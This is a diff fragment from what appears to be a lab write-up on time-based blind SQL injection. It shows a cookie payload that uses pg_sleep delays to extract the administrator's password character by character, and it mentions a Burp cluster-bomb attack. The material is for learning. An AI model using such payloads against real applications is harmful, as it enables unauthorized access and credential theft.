@@ -13,8 +13,11 @@
 
  ## Exploitation:
  According to document I had payload like that:
+ 
+ 
  ```
 sql
+
 TrackingId=dZv5SyaRIWu4wZ5c' %3b SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- ; session=QL0dKKdJndQtQSPNSQSPpFmXb89YEwBy
 ```
 **Like previous labs, in this lab, I choose type attack is cluster bomb to attack 2 varible:**
